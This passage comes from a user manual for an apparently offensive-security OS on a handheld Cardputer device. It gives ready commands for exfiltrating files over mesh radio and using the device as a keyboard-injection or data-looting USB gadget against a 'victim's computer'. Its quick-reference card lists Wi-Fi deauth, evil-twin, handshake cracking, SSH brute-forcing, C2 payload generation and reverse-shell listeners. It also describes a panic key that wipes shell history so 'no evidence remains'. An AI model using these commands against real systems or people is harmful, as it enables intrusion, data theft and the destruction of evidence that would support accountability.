mesh-chat info                       # Show local node status
```

### Advanced mesh-setup commands
```bash
mesh-setup send "Target found"       # Send encrypted message
mesh-setup send "Exfil data" !abc123 # Send to specific node
mesh-setup listen                    # Continuous message monitoring
mesh-setup chat                      # Interactive chat mode
mesh-setup relay                     # Enable mesh relay / internet bridge
mesh-setup nodes                     # List discovered mesh nodes
mesh-setup exfil /path/to/file       # Exfiltrate file over mesh (chunked base64)
```

---

## 22. USB Gadget Mode

Plug the Cardputer Zero's USB-C port into a victim's computer. Flip the USB-C switch to "device" mode.

### HID (Keyboard) — Rubber Ducky
```bash
sudo usb-gadget-mode hid
# Cardputer enumerates as a USB keyboard
# Loads and executes payloads from /opt/cardputer/payloads/ducky.txt
```

### Mass Storage — Exfiltration
```bash
sudo usb-gadget-mode mass
# Cardputer appears as a USB drive
# Victim's files are accessible; /opt/cardputer/loot/ is exposed
```

### Network Adapter — Bridge
```bash
sudo usb-gadget-mode ncm
# Cardputer becomes a USB network adapter
# Victim's traffic can be routed through the Cardputer
```

### Serial Console — Debug
```bash
sudo usb-gadget-mode serial
# Cardputer provides a USB serial console
# Useful for headless debug from another machine
```

### Disable gadget mode
```bash
sudo usb-gadget-mode off
```

---

## 23. Power Management

ZERO-DAY OS has three power profiles tuned for the 1500mAh battery:

### Performance (~4 hours)
```bash
sudo power-mode performance
# 1GHz quad-core, all radios, full brightness
# Use when: actively attacking, need max speed
```

### Balanced (~6 hours)
```bash
sudo power-mode balanced
# 800MHz dual-core, WiFi on, BT off, medium brightness
# Use when: passively monitoring, waiting for targets
```

### Stealth (~10 hours)
```bash
sudo power-mode stealth
# 600MHz single-core, all radios off, dim screen
# Use when: lying low, preserving battery, going dark
```

### Battery check
```bash
cardputer-battery
# Output: Voltage, Capacity %, Status, Time remaining
```

### Toggle WiFi radio
```bash
cardputer-wifi-toggle     # Toggle wlan0 on/off
# Saves ~30mA when off — significant for battery life
```

---

## 24. Panic System

The panic system is designed for the moment you need to disappear — fast.

### Trigger panic
```
Fn + P
```

**What happens in 0.3 seconds:**

| Phase | Duration | Action |
|---|---|---|
| Kill | 0.1s | `kill -9` every offensive process (aircrack, bettercap, nmap, john, hydra, all shells) |
| Wipe | 0.1s | Remove `~/.bash_history`, `/tmp/*`, tmux history |
| Sanitize | 0.1s | Clear terminal, reset screen buffer |
| Silence | instant | `rfkill block all` — kill WiFi + BT radio emissions |

The screen shows a clean login prompt. No evidence remains visible.

### Then go stealth
```
Fn + Space
```

- Backlight off — the device appears completely powered down
- No visible light, no RF emissions
- Press any key to wake the screen

### Panic log
All panic events are recorded:
```bash
cat /opt/cardputer/panic.log
# [2026-04-25 14:30:00] PANIC TRIGGERED
# [2026-04-25 14:30:00] PANIC COMPLETE
```

---

## 25. OpenCode (Pocket IDE)

OpenCode is an AI-assisted code editor you launch from the keyboard. It runs in a tmux split — editor on top, live console on the bottom.

### Launch
```bash
opencode-session                  # Full workspace at /opt/cardputer/workspace/
opencode-session /path/to/file    # Open specific file
opencode-session /path/dir name  # Open file in directory
```

Or press `Fn + O` from anywhere.

### Quick AI prompt
```bash
opencode-ask "How do I crack a WPA3 handshake?"    # Ask a question inline
opencode-ask                                         # Interactive — type your question
Fn + A                                               # Same thing from anywhere
```

Saves questions to `/opt/cardputer/workspace/` for later review. If the AI backend isn't available yet, the question is stored for when it is.

> **armhf note:** The native OpenCode binary is not yet available for armhf. A stub is installed that provides the same tmux-based workflow using `nano` as the editor. When an armhf binary is released, `opencode` will be updated automatically via the first-boot service.

---

## 26. Troubleshooting

### System won't boot
- Verify the microSD is properly inserted
- Check the image was written correctly (re-flash)
- Connect via serial console (115200 baud) for boot messages:
  ```
  screen /dev/ttyUSB0 115200
  ```

### WiFi not connecting
```bash
# Check radio status:
rfkill list

# Unblock if blocked:
rfkill unblock all

# Try manual connection:
wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
dhclient wlan0
```

### Dongle not appearing as wlan1
```bash
# Check USB device:
lsusb | grep -i realtek

# Check driver:
lsmod | grep 8821

# Reinstall:
dongle-setup install
```

### Out of disk space
```bash
# Check usage:
df -h

# Clean package cache:
apt clean
apt autoremove --purge -y

# Remove large wordlists (keep only essential):
rm -rf /usr/share/seclists/Passwords/databases
rm -rf /usr/share/seclists/Discovery
```

### Low memory
```bash
# Check RAM:
free -h

# Kill heavy processes:
pkill -f bettercap
pkill -f wireshark

# Switch to stealth mode (saves ~50MB RAM):
sudo power-mode stealth
```

### SSH connection refused
```bash
# Verify SSH is running:
systemctl status ssh

# Start it:
systemctl start ssh

# Check firewall:
iptables -L -n
```

---

## 27. File System Layout

### System directories
| Path | Purpose |
|---|---|
| `/opt/cardputer/` | All user data — tools, configs, loot |
| `/opt/cardputer/handshakes/` | WPA handshake captures (`.cap` files) |
| `/opt/cardputer/pmkid/` | PMKID hash captures |
| `/opt/cardputer/payloads/` | Generated payloads (quick-c2 output) |
| `/opt/cardputer/workspace/` | OpenCode working directory |
| `/opt/cardputer/loot/` | All captured data, organized by type |
| `/opt/cardputer/config/` | Tool configs, attack profiles, wordlists |
| `/usr/local/bin/` | All one-key hacking scripts |
| `/etc/i3/config` | i3 window manager keybindings |
| `/etc/X11/xorg.conf` | X11 configuration for ST7789 LCD |
| `/etc/zeroday-release` | Build info and version |

### RAM-mounted directories (tmpfs)
These are wiped on reboot — designed to reduce SD card writes:

| Path | Size | Purpose |
|---|---|---|
| `/tmp` | 64MB | Temporary files |
| `/var/log` | 16MB | System logs (lost on reboot) |
| `/var/tmp` | 16MB | Persistent temp files |

> **Note:** If you need to preserve logs across reboots, copy them to `/opt/cardputer/loot/` before shutting down.

---

## 28. Expansion Hardware Wiring

### CC1101 Sub-GHz Transceiver (2.54mm 14-Pin ExtPort — SPI)

```
CC1101 Pin    →    Cardputer Zero Pin
─────────         ──────────────────
VCC (3.3V)   →    Pin 1 (3.3V)
GND          →    Pin 2 (GND)
MOSI         →    Pin 4 (SPI0 MOSI)
MISO         →    Pin 5 (SPI0 MISO)
SCK          →    Pin 6 (SPI0 SCLK)
CSN          →    Pin 7 (SPI0 CE0)
GDO0         →    Pin 9 (GPIO)
GDO2         →    Pin 10 (GPIO)
```

> Pin assignments are PLACEHOLDER — will be finalized when hardware ships.

### PN532 NFC Module (Grove HY2.0-4P — I2C Mode)

```
PN532 Pin     →    Cardputer Zero Grove Pin
──────────         ────────────────────────
VCC           →    Pin 1 (VCC 3.3V/5V)
SDA           →    Pin 2 (SDA — I2C data)
SCL           →    Pin 3 (SCL — I2C clock)
GND           →    Pin 4 (GND)

Switch settings: SW1=ON, SW2=ON (I2C mode)
```

### Meshtastic LoRa Module (Grove HY2.0-4P — UART Mode)

```
LoRa Pin      →    Cardputer Zero Grove Pin
─────────         ────────────────────────
VCC           →    Pin 1 (VCC 3.3V/5V)
TX            →    Pin 2 (RX — UART receive)
RX            →    Pin 3 (TX — UART transmit)
GND           →    Pin 4 (GND)

Switch settings: SW1=OFF, SW2=OFF (UART mode)
```

> ⚠️ PN532 and Meshtastic share the Grove port and cannot be used simultaneously.

---

## Quick Reference Card

```
╔══════════════════════════════════════════════════════════╗
║              ZERO-DAY OS  —  QUICK REFERENCE              ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  LOGIN:     root / zeroday                               ║
║  TUI:       Fn+Tab  or  cyber_launcher                   ║
║  TERMINAL:  Fn+Return                                    ║
║  PANIC:     Fn+P                                         ║
║  STEALTH:   Fn+Space                                     ║
║  OPENCODE:  Fn+O                                         ║
║                                                          ║
║  WiFi scan      sudo wifi-scan wlan0                     ║
║  WiFi survey    sudo wifi-survey-log wlan0 300             ║
║  Deauth         sudo wifi-deauth wlan1 <BSSID> <CH>      ║
║  Handshake      sudo wifi-handshake wlan1 <BSSID> <CH>   ║
║  PMKID          sudo wifi-pmkid wlan1 <BSSID> <CH>       ║
║  Evil twin      sudo wifi-evil-twin wlan0 eth0 "SSID"   ║
║  Crack          sudo wifi-crack *.cap                     ║
║  MAC rotate     sudo mac-rotate wlan0 random               ║
║                                                          ║
║  Host discovery sudo net-discover eth0                   ║
║  Port scan      net-quickscan <IP> quick                  ║
║  Vuln scan      sudo net-vulnscan <IP>                   ║
║  IoT scan       iot-scan <IP/subnet> cameras              ║
║  C2 listener    quick-c2 listen 4444                      ║
║  C2 payload     quick-c2 payload bash <IP> <PORT>         ║
║  SOCKS proxy    tunnel-mgr socks <host> 1080               ║
║  Port forward   tunnel-mgr forward 8080 <rhost:rport> <ssh>║
║  DoH proxy     sudo doh-proxy start cloudflare 5353       ║
║                                                          ║
║  BT scan        sudo bt-scan                             ║
║  Bettercap      sudo bettercap -I wlan0                   ║
║  IR capture     sudo ir-scan                             ║
║  Camera snap    cam-snap                                 ║
║  Camera OCR     cam-ocr                                  ║
║                                                          ║
║  Crack hashes   john --format=raw-md5 hashes.txt          ║
║  Brute creds    hydra -l admin -P words.txt ssh://<IP>    ║
║  Web enum       gobuster dir -u http://<IP> -w common.txt ║
║                                                          ║
║  SDR scan       sudo sdr-scan 433.0-434.0 10             ║
║  RF capture      sudo rf-capture 433.92 10                ║
║  GPIO probe      sudo gpio-probe                         ║
║                                                          ║
║  Revshell       revshell-listen 4444                     ║
║  C2 payload     quick-c2 payload bash <IP> 4444           ║
║                                                          ║
║  Dongle         dongle-setup status                      ║
║  MonsterC5      monsterctl status                         ║
║  JanOS TUI      install-janos run                         ║
║  Ragnar scan    ragnar-scan eth0 quick                    ║
║  Loot organize  loot-organize                             ║
║  Battery        cardputer-battery                        ║
║  Power mode     power-mode stealth                       ║
║  USB gadget     sudo usb-gadget-mode hid                  ║
║  OpenCode ask   opencode-ask "question"                  ║
║  Mesh setup     mesh-setup install                       ║
║                                                          ║
║  Change pass    passwd                                   ║
║  WiFi setup     cardputer-wifi-setup                     ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

---

<p align="center">
<strong>Built for the field. Designed for the edge. Fits in your wallet.</strong>
</p>